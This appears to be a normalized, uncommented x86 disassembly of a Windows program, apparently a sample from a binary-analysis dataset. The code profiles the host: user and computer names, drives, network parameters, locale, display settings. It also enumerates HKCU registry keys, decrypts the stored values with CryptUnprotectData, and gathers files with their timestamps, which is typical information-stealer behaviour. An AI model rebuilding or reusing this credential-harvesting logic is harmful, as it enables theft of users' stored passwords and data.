sub_401020
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x378
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_4077a2
push 0x400
call sub_409984
mov ebx eax
pop ecx
lea eax [ ebp - 0x54 ]
push eax
call [ GetSystemInfo@IAT ]
mov al [ ebp - 0x40 ]
push ebx
push 0x1
sub esp 0x10
add al 0x30
mov ecx esp
push r--data
mov [ ebx ] al
mov [ ebx + 0x1 ] 0x0
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push 0xb
pop ecx
mov esi r--data
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
movsb [ edi ] [ esi ]
push eax
mov esi 0x80000002
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
call [ GetLogicalDrives@IAT ]
xor edi edi
cmp eax edi
mov [ ebp + 0x6c ] eax
mov [ ebp + 0x70 ] edi
jbe r-xdata
lea eax [ ebp ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xa ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp + 0x6 ]
push eax
movzx eax [ ebp + 0x2 ]
push eax
movzx eax [ ebp ]
push eax
push r--data
push ebx
call sub_409dc9
add esp 0x20
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x60 ]
push eax
mov edi 0x3e8
push ebx
mov [ ebp + 0x60 ] edi
call [ GetUserNameA@IAT ]
push [ ebp + 0x60 ]
lea eax [ ebp + 0x10 ]
push ebx
push eax
call sub_4063c6
add esp 0xc
push [ ebp + 0x14 ]
push [ ebp + 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x60 ]
push eax
push ebx
mov [ ebp + 0x60 ] edi
call [ GetComputerNameA@IAT ]
sub esp 0x10
mov eax esp
push [ ebp + 0x60 ]
push ebx
push eax
call sub_4063c6
add esp 0xc
lea eax [ ebp + 0x23 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_408073
lea ecx [ ebp + 0x23 ]
call sub_407e74
push [ ebp + 0x14 ]
push [ ebp + 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push 0x248
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
mov [ ebp + 0x30 ] 0x248
lea eax [ ebp + 0x30 ]
push eax
push edi
call GetNetworkParams
test eax eax
jne r-xdata
test [ ebp + 0x6c ] 0x1
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
push r--data
push eax
mov [ ebp + 0x70 ] eax
call edi
push r--data
push [ ebp + 0x70 ]
mov [ ebp + 0x5c ] eax
call edi
push r--data
push [ ebp + 0x70 ]
mov [ ebp + 0x68 ] eax
call edi
push r--data
push [ ebp + 0x70 ]
mov [ ebp + 0x64 ] eax
call edi
push r--data
push [ ebp + 0x70 ]
mov [ ebp + 0x6c ] eax
call edi
xor ecx ecx
cmp [ ebp + 0x5c ] ecx
je r-xdata
push edi
push edi
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ edi + 0x84 ]
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ edi + 0x110 ]
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
mov edi [ edi + 0x10c ]
jmp r-xdata
inc [ ebp + 0x70 ]
shr [ ebp + 0x6c ] 0x1
jne r-xdata
mov al [ ebp + 0x70 ]
add al 0x41
push ebx
push ebx
mov [ ebx ] al
mov [ ebx + 0x1 ] 0x3a
mov [ ebx + 0x2 ] 0x5c
mov [ ebx + 0x3 ] 0x0
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push ebx
mov [ ebp + 0x68 ] edi
mov [ ebp + 0x5c ] edi
mov [ ebp + 0x30 ] edi
mov [ ebp + 0x64 ] edi
call [ GetDriveTypeA@IAT ]
mov edi eax
cmp edi 0x2
je r-xdata
push ebx
call [ GetKeyboardLayoutNameA@IAT ]
push ebx
call sub_409f34
push eax
lea eax [ ebp + 0x34 ]
push ebx
push eax
call sub_4063c6
add esp 0x10
push [ ebp + 0x38 ]
push [ ebp + 0x3c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
call [ GetACP@IAT ]
push eax
mov edi r--data
push edi
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
call [ GetOEMCP@IAT ]
push eax
push edi
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_4060a1
push [ ebp + 0x74 ]
call sub_409f34
pop ecx
mov ecx esp
push eax
push [ ebp + 0x74 ]
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp + 0x23 ]
push eax
lea ecx [ ebp + 0x34 ]
call sub_408073
lea ecx [ ebp + 0x23 ]
call sub_407e74
push [ ebp + 0x38 ]
push [ ebp + 0x3c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push ebx
mov esi 0x400
push esi
call [ GetCurrentDirectoryA@IAT ]
push ebx
call sub_409f34
sub esp 0xc
mov ecx esp
push eax
push ebx
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp + 0x23 ]
push eax
lea ecx [ ebp + 0x34 ]
call sub_408073
lea ecx [ ebp + 0x23 ]
call sub_407e74
push [ ebp + 0x38 ]
push [ ebp + 0x3c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push ebx
push esi
call [ GetTempPathA@IAT ]
push ebx
call sub_409f34
sub esp 0xc
mov ecx esp
push eax
push ebx
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp + 0x23 ]
push eax
lea ecx [ ebp + 0x34 ]
call sub_408073
lea ecx [ ebp + 0x23 ]
call sub_407e74
push [ ebp + 0x38 ]
push [ ebp + 0x3c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
mov edi [ GetSystemMetrics@IAT ]
push 0x0
call edi
push eax
mov esi r--data
push esi
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push 0x1
call edi
push eax
push esi
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
lea eax [ ebp - 0x170 ]
push eax
push 0xffffffff
push 0x0
call [ EnumDisplaySettingsA@IAT ]
push [ ebp - 0x108 ]
push esi
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push ebx
call sub_4092d2
pop ecx
lea ecx [ ebp + 0x34 ]
call sub_407e74
lea ecx [ ebp + 0x10 ]
call sub_407e74
lea ecx [ ebp + 0x44 ]
call sub_40797c
pop edi
pop esi
pop ebx
add ebp 0x78
leave
retn
cmp [ ebp + 0x68 ] ecx
je r-xdata
test edi edi
jne r-xdata
mov eax [ ebp + 0x64 ]
imul eax [ ebp + 0x68 ]
shr eax 0xa
imul eax [ ebp + 0x5c ]
shr eax 0xa
push eax
push r--data
push ebx
call sub_409dc9
add esp 0xc
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
mov eax edi
dec eax
dec eax
je r-xdata
lea eax [ ebp + 0x64 ]
push eax
lea eax [ ebp + 0x30 ]
push eax
lea eax [ ebp + 0x5c ]
push eax
lea eax [ ebp + 0x68 ]
push eax
push ebx
call [ GetDiskFreeSpaceA@IAT ]
cmp [ ebp + 0x64 ] ecx
je r-xdata
lea eax [ edi + 0x4 ]
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
mov edi [ edi ]
push r--data
dec eax
je r-xdata
cmp [ ebp + 0x6c ] ecx
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
cmp eax ecx
je r-xdata
push ebx
call sub_409dc9
pop ecx
pop ecx
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
xor edi edi
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
push ebx
call sub_409dc9
pop ecx
pop ecx
lea eax [ ebp - 0x300 ]
push eax
push 0x101
call [ ebp + 0x5c ]
test eax eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
push ebx
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x44 ]
call sub_407870
push 0x80
lea eax [ ebp - 0xd4 ]
push eax
call [ ebp + 0x68 ]
test eax eax
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0xd4 ]
push eax
call [ ebp + 0x64 ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ ebp + 0x6c ]
push eax
push r--data
push ebx
call sub_409dc9
add esp 0xc
sub_40182c
push ebp
mov ebp esp
sub esp 0x658
push ebx
push esi
push edi
mov edi 0xfc
xor ebx ebx
push edi
lea eax [ ebp - 0x55c ]
push ebx
push eax
mov [ ebp - 0x460 ] bl
call sub_409951
mov esi 0x200
push esi
lea eax [ ebp - 0x460 ]
push ebx
push eax
call sub_409951
push esi
lea eax [ ebp - 0x260 ]
push ebx
push eax
mov [ ebp - 0x260 ] bl
call sub_409951
push edi
lea eax [ ebp - 0x658 ]
push ebx
push eax
call sub_409951
push 0x40
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_409951
push r--data
mov [ ebp - 0x60 ] 0x69f31ea3
mov [ ebp - 0x5c ] 0x1fd96207
mov [ ebp - 0x58 ] 0x7d35e91e
mov [ ebp - 0x54 ] 0x487dd24f
call sub_409704
add esp 0x40
push eax
lea eax [ ebp - 0x460 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x460 ]
push eax
call sub_409f34
push r--data
mov [ ebp - 0x8 ] eax
call sub_409704
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x260 ]
push eax
call sub_409f34
add esp 0x1c
xor edi edi
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] eax
mov ecx 0xba0da71d
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
movsx edx [ ebp + edi - 0x460 ]
imul edx ecx
imul ecx ecx 0xbc8f
mov eax edi
and eax 0x3
lea esi [ ebp + eax * 4 - 0x60 ]
xor [ esi ] edx
inc edi
cmp edi [ ebp - 0x8 ]
jb r-xdata
mov eax [ ebp - 0x60 ]
mov esi [ ebp + 0x8 ]
or eax 0x1
xor ecx ecx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
movsx edx [ ebp + eax - 0x260 ]
imul edx ecx
imul ecx ecx 0xbc8f
mov esi edi
and esi 0x3
lea esi [ ebp + esi * 4 - 0x60 ]
xor [ esi ] edx
inc edi
inc eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x20 ]
push eax
shr ecx 0x1
mov [ ecx + esi + 0x4 ] bl
push ebx
lea eax [ ebp - 0x18 ]
add ecx 0xfffffffd
push eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x20 ] 0x10
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
mov dl [ esi + ecx + 0x4 ]
mov bl [ esi + ecx + 0x5 ]
dec dl
shl dl 0x4
sub bl 0x21
movzx edx dl
movzx edi bl
or edx edi
movzx edi al
imul eax eax 0x10ff5
sub edx edi
mov edi ecx
shr edi 0x1
inc ecx
inc ecx
cmp ecx [ ebp + 0xc ]
mov [ edi + esi ] dl
jb r-xdata
xor eax eax
push [ ebp - 0x10 ]
mov esi [ ebp + 0x10 ]
push [ ebp - 0xc ]
push esi
call sub_4098f3
mov eax [ ebp - 0x10 ]
add esp 0xc
mov [ eax + esi ] bl
push [ ebp - 0xc ]
call [ LocalFree@IAT ]
xor eax eax
inc eax
jmp r-xdata
xor ebx ebx
pop edi
pop esi
pop ebx
leave
retn
sub_401a01
push ebp
mov ebp esp
sub esp 0xa50
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x40 ]
call sub_4077a2
mov ebx [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x9
xor edi edi
push edi
push r--data
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40797c
pop edi
pop esi
pop ebx
leave
retn
call sub_405fe1
push edi
push edi
push edi
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push edi
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
je r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
call sub_406017
mov esi 0x200
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
jb r-xdata
lea eax [ ebp - 0x250 ]
push eax
lea eax [ ebp - 0x650 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push 0x20019
push edi
lea eax [ ebp - 0x650 ]
push eax
push 0x80000001
mov [ ebp - 0x8 ] esi
call ebx
cmp eax edi
jne r-xdata
push esi
lea eax [ ebp - 0x250 ]
push edi
push eax
mov [ ebp - 0x14 ] edi
call sub_409951
push esi
lea eax [ ebp - 0x650 ]
push edi
push eax
call sub_409951
push 0x400
lea eax [ ebp - 0xa50 ]
push edi
push eax
call sub_409951
push esi
lea eax [ ebp - 0x450 ]
push edi
push eax
call sub_409951
add esp 0x30
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x14 ] esi
push [ ebp - 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xa50 ]
push eax
push edi
push edi
push r--data
push [ ebp - 0x28 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0xa50 ]
push eax
call sub_40182c
add esp 0xc
test eax eax
jbe r-xdata
lea eax [ ebp - 0x450 ]
push eax
call sub_409f34
test eax eax
pop ecx
jbe r-xdata
lea eax [ ebp - 0x250 ]
push eax
call sub_409f34
push eax
lea eax [ ebp - 0x250 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_4063c6
add esp 0x10
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x40 ]
call sub_407870
lea eax [ ebp - 0x450 ]
push eax
call sub_409f34
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x450 ]
push eax
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp - 0x4d ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_408073
lea ecx [ ebp - 0x4d ]
call sub_407e74
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x40 ]
call sub_407870
lea ecx [ ebp - 0x24 ]
call sub_407e74
sub_401c44
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_40957e
pop ecx
sub_401c92
mov eax [ esp + 0x4 ]
mov dx [ eax + 0x6 ]
mov ecx [ esp + 0x8 ]
cmp dx [ ecx + 0x6 ]
jne r-xdata
xor eax eax
retn
mov dx [ eax + 0x4 ]
cmp dx [ ecx + 0x4 ]
jne r-xdata
mov dx [ eax + 0x8 ]
cmp dx [ ecx + 0x8 ]
jne r-xdata
mov dx [ eax + 0xe ]
cmp dx [ ecx + 0xe ]
jne r-xdata
mov dx [ eax + 0xa ]
cmp dx [ ecx + 0xa ]
jne r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax + 0xc ]
cmp dx [ ecx + 0xc ]
jne r-xdata
mov ax [ eax ]
cmp ax [ ecx ]
jne r-xdata
xor eax eax
inc eax
retn
sub_401cef
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
movzx edx [ eax ]
push esi
movzx esi [ ecx ]
cmp dx si
je r-xdata
movzx edx [ eax + 0x2 ]
movzx esi [ ecx + 0x2 ]
cmp dx si
jne r-xdata
sbb eax eax
neg eax
pop esi
retn
movzx edx [ eax + 0x6 ]
movzx esi [ ecx + 0x6 ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0x8 ]
movzx esi [ ecx + 0x8 ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0xa ]
movzx esi [ ecx + 0xa ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0xc ]
movzx esi [ ecx + 0xc ]
cmp dx si
jne r-xdata
movzx eax [ eax + 0xe ]
movzx ecx [ ecx + 0xe ]
cmp ax cx
jne r-xdata
mov al 0x1
pop esi
retn
sub_401d5b
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0xc4
push ebx
push esi
push edi
mov edi [ ebp + 0x74 ]
mov ebx [ edi ]
push 0x1
call [ Sleep@IAT ]
xor esi esi
cmp ebx esi
je r-xdata
xor eax eax
inc eax
cmp [ rw-data ] 0x500000
jl r-xdata
push ebx
call sub_409f34
cmp eax 0x4
pop ecx
jb r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_409f34
cmp eax 0x5
pop ecx
jle r-xdata
pop edi
pop esi
pop ebx
add ebp 0x6c
leave
retn
cmp [ ebp + 0x7c ] esi
je r-xdata
lea eax [ eax + ebx - 0x4 ]
push r--data
push eax
call sub_409f43
pop ecx
push eax
call sub_40a08b
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x200
push 0x40
call [ LocalAlloc@IAT ]
push [ ebp + 0x78 ]
mov edi eax
push r--data
push edi
call [ wsprintfA@IAT ]
lea eax [ ebp + 0x68 ]
push eax
push edi
mov [ ebp + 0x68 ] 0x3b
call sub_40a1e7
add esp 0x14
jmp r-xdata
add edi 0x4
push edi
push rw-data
call sub_401cef
test al al
pop ecx
pop ecx
jne r-xdata
lea ecx [ ebp + 0x3c ]
call sub_401c72
mov eax [ ebp + 0x74 ]
mov eax [ eax + 0x14 ]
lea esi [ edi + 0x4 ]
lea edi [ ebp + 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add eax eax
movsd [ edi ] [ esi ]
lea ecx [ ebp + 0x2c ]
mov [ ebp + 0x50 ] eax
call sub_407e64
lea eax [ ebp + 0x2c ]
push eax
push ebx
call sub_405c4d
test al al
pop ecx
pop ecx
je r-xdata
cmp eax esi
jne r-xdata
push rw-data
push edi
call sub_401cef
test al al
pop ecx
pop ecx
jne r-xdata
lea ecx [ ebp + 0x2c ]
call sub_407e74
jmp r-xdata
push [ ebp + 0x30 ]
push [ ebp + 0x3c ]
call sub_409ed4
push [ ebp + 0x7c ]
lea eax [ ebp + 0x3c ]
push [ ebp + 0x78 ]
push eax
call sub_401d5b
add esp 0x14
push eax
push ebx
call sub_40628d
test al al
pop ecx
pop ecx
jne r-xdata
jmp r-xdata
push r--data
push ebx
call sub_40948c
mov edi eax
cmp edi esi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp + 0x68 ]
push eax
push esi
call sub_40a1e7
pop ecx
pop ecx
push 0x2
push esi
push edi
call sub_409664
push edi
call sub_4096c0
push 0x0
push 0x0
push edi
mov esi eax
call sub_409664
add esp 0x1c
test esi esi
jle r-xdata
push edi
call sub_409393
pop ecx
mov eax esi
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
cmp eax 0x800
jg r-xdata
cmp eax 0x2
jl r-xdata
push ebx
call sub_406dab
mov [ esp ] 0x1e61
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x40 ]
call sub_4077a2
push [ rw-data ]
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x40 ]
call sub_407870
push ebx
call sub_409f34
push eax
lea eax [ ebp + 0x1c ]
push ebx
push eax
call sub_4063c6
add esp 0x10
push [ ebp + 0x20 ]
push [ ebp + 0x24 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x40 ]
call sub_407870
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp + 0x30 ]
push eax
push [ edi ]
call [ GetFileTime@IAT ]
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp + 0x64 ]
push eax
movzx eax [ ebp + 0x62 ]
push eax
movzx eax [ ebp + 0x60 ]
push eax
movzx eax [ ebp + 0x5e ]
push eax
movzx eax [ ebp + 0x5a ]
push eax
movzx eax [ ebp + 0x58 ]
push eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call sub_409dc9
add esp 0x20
lea eax [ ebp - 0x58 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x40 ]
call sub_407870
push esi
call sub_409984
push edi
push 0x1
push esi
mov [ ebp + 0x74 ] eax
push eax
call sub_40954d
add esp 0x14
push [ ebp + 0x74 ]
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp + 0x40 ]
call sub_407870
lea ecx [ ebp + 0x1c ]
call sub_407e74
lea ecx [ ebp + 0x40 ]
call sub_40797c
mov ebx rw-data
mov ecx ebx
call sub_407a67
cmp [ rw-data ] 0x500000
jge r-xdata
push [ ebp + 0x74 ]
call sub_4092d2
pop ecx
mov esi rw-data
mov ecx esi
call sub_401c44
add [ rw-data ] 0x3
movzx eax [ rw-data ]
and [ rw-data ] 0x0
push eax
mov ecx esi
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
sub [ rw-data ] 0x3
mov eax [ rw-data ]
add [ rw-data ] eax
cmp eax 0xf
jle r-xdata
push ebx
call sub_406e91
pop ecx
sub_4020dd
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
cmp eax 0x3
jl r-xdata
xor eax eax
jmp r-xdata
cmp [ edi ] 0x2e
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
push edi
call sub_40948c
mov esi eax
test esi esi
pop ecx
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
xor eax eax
inc eax
push 0x1c
call sub_409984
test eax eax
pop ecx
je r-xdata
xor ebx ebx
mov ecx eax
call sub_401c72
mov ebx eax
jmp r-xdata
cmp eax edi
jne r-xdata
push edi
push [ ebx ]
call sub_409ed4
push 0x2
push 0x0
push esi
call sub_409664
push esi
call sub_4096c0
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
mov [ ebx + 0x14 ] eax
add esp 0x18
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
call [ GetFileTime@IAT ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ FileTimeToSystemTime@IAT ]
push esi
call sub_409393
lea edi [ ebx + 0x4 ]
lea esi [ ebp - 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] 0x200
xor edi edi
push 0x40
mov [ ebx + 0x18 ] edi
call [ LocalAlloc@IAT ]
push [ ebp + 0x10 ]
mov esi eax
push r--data
push esi
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push esi
mov [ ebp - 0x4 ] 0x3b
mov [ ebp - 0xc ] edi
call sub_40a1e7
add esp 0x14
jmp r-xdata
push eax
push [ ebp + 0x8 ]
call sub_40628d
test al al
pop ecx
pop ecx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_40a1e7
pop ecx
pop ecx
push 0x2
push edi
push [ ebp - 0x8 ]
call sub_409664
push [ ebp - 0x8 ]
call sub_4096c0
push edi
push edi
push [ ebp - 0x8 ]
mov esi eax
call sub_409664
mov eax esi
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
add esp 0x1c
cmp eax 0x800
jg r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_4063c6
add esp 0xc
cmp [ ebp - 0xc ] edi
je r-xdata
cmp eax 0x2
jl r-xdata
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ rw-data ]
call sub_407870
push [ ebp + 0x8 ]
call sub_406dab
mov eax [ ebp + 0xc ]
pop ecx
mov ecx [ eax ]
mov [ ecx + 0x18 ] ebx
lea ecx [ ebp - 0x34 ]
mov [ eax ] ebx
call sub_407e74
sub esp 0x10
lea eax [ ebp - 0x34 ]
mov ecx esp
push eax
call sub_407e01
